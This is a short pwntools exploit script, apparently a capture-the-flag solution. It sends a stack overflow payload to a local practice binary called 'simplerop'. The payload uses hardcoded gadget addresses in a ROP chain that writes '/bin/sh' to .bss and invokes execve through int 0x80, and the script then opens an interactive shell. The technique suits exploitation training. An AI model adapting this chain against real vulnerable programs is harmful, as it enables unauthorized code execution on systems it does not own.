#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

elf = ELF("./simplerop")
read_addr = elf.symbols["read"]
bss_addr = elf.bss()
pop_edx_ecx_ebx_ret = 0x0806e850
pop_eax_ret = 0x080bae06
int80_addr = 0x080493e1

io = process("./simplerop")
payload = fit({0x1c + 0x4: [p32(read_addr), p32(pop_edx_ecx_ebx_ret), p32(0x0), p32(bss_addr), p32(0x8)]})
payload += flat([pop_edx_ecx_ebx_ret, 0, 0, bss_addr])
payload += flat([pop_eax_ret, 11])
payload += p32(int80_addr)

io.sendlineafter(" :", payload)
io.sendline("/bin/sh\0")
io.interactive()
io.close()
